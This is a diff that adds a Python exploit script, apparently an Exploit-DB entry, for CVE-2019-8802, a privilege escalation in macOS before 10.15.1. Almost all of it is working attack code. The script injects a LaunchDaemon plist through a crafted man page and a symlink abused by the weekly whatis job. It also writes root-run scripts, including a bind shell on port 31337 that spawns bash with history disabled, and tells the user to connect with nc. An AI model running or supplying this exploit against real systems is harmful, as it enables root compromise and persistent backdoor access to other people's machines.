@@ -1,0 +1,114 @@
+# Exploit Title: MacOS 320.whatis Script - Privilege Escalation
+# Date: 2020-05-06
+# Exploit Author: Csaba Fitzl
+# Vendor Homepage: https://support.apple.com/en-us/HT210722
+# Version: macOS < 10.15.1
+# Tested on: macOS
+# CVE : CVE-2019-8802
+
+import sys
+import os
+
+man_file_content = """
+.TH exploit 1 "August 16 2019" "Csaba Fitzl"
+.SH NAME
+exploit \- --> <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"><plist version="1.0"><dict><key>Label</key><string>com.sample.Load</string><key>ProgramArguments</key><array> <string>/Applications/Scripts/sample.sh</string></array><key>RunAtLoad</key><true/></dict></plist><!--
+"""
+
+sh_quick_content = """
+/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal
+"""
+
+sh_reboot_content = """
+python /Applications/Scripts/bind.py
+"""
+
+python_bind_content = """
+#!/usr/bin/python2
+import os
+import pty
+import socket
+
+lport = 31337
+
+def main():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.bind(('', lport))
+    s.listen(1)
+    (rem, addr) = s.accept()
+    os.dup2(rem.fileno(),0)
+    os.dup2(rem.fileno(),1)
+    os.dup2(rem.fileno(),2)
+    os.putenv("HISTFILE",'/dev/null')
+    pty.spawn("/bin/bash")
+    s.close()
+	
+if __name__ == "__main__":
+    main()
+"""
+
+def create_man_file():
+	print("[i] Creating bogus man page: /usr/local/share/man/man1/<!--exploit.1")	
+	f = open('/usr/local/share/man/man1/<!--exploit.1','w')
+	f.write(man_file_content)
+	f.close()
+
+def create_symlink():
+	print("[i] Creating symlink in /usr/local/share/man/")
+	os.system('ln -s /Library/LaunchDaemons/com.sample.Load.plist /usr/local/share/man/whatis.tmp')	
+
+def create_scripts_dir():
+	print("[i] Creating /Applications/Scripts directory")
+	os.system('mkdir /Applications/Scripts')
+
+def create_quick_scripts():
+	create_scripts_dir()
+	print("[i] Creating script file to be called by LaunchDaemon")
+	f = open('/Applications/Scripts/sample.sh','w')
+	f.write(sh_quick_content)
+	f.close()
+	os.system('chmod +x /Applications/Scripts/sample.sh')
+
+def create_reboot_scripts():
+	create_scripts_dir()
+	print("[i] Creating script file to be called by LaunchDaemon")
+	f = open('/Applications/Scripts/sample.sh','w')
+	f.write(sh_reboot_content)
+	f.close()
+	os.system('chmod +x /Applications/Scripts/sample.sh')
+	print("[i] Creating python script for bind shell")
+	f = open('/Applications/Scripts/bind.py','w')
+	f.write(python_bind_content)
+	f.close()
+
+def rename_man_pages():
+	for root, dirs, files in os.walk("/usr/local/share/man"):
+		for file in files:
+			if file[0] in "0123456789": #if filename begins with a number
+				old_file = os.path.join(root, file)
+				new_file = os.path.join(root, 'a' + file)
+				os.rename(old_file, new_file) #rename with adding a prefix
+				print("[i] Renaming: " + os.path.join(root, file))
+
+def main():
+	if len(sys.argv) != 2 :
+		print "[-] Usage: python makewhatis_exploit.py [quick|reboot]"
+		sys.exit (1)
+	if sys.argv[1] == 'quick':
+		create_man_file()
+		create_symlink()
+		create_quick_scripts()
+		rename_man_pages()
+		print "[+] Everything is set, run periodic tasks with:\nsudo periodic weekly\n[i] and then simulate a boot load with: \nsudo launchctl load com.sample.Load.plist"
+	elif sys.argv[1] == 'reboot':
+		create_man_file()
+		create_symlink()
+		create_reboot_scripts()
+		rename_man_pages()
+		print "[+] Everything is set, run periodic tasks with:\nsudo periodic weekly\n[i] reboot macOS or run `sudo launchctl load com.sample.Load.plist` and connect to your root shell via:\nnc 127.1 31337"
+	else:
+		print "[-] Invalid arguments"
+		print "[-] Usage: python makewhatis_exploit.py [quick|reboot]"
+
+if __name__== "__main__":
+	main()
